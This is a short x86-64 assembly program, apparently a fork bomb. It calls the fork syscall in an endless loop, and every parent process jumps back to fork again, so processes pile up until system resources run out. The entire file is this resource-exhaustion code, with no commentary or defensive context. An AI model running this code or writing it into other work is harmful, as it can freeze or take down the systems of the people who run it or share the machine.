global _start

section .text

_start:
	; pid_t fork(void)
	; rax=57
	push 0x39
	pop rax
	syscall
	jnz _start
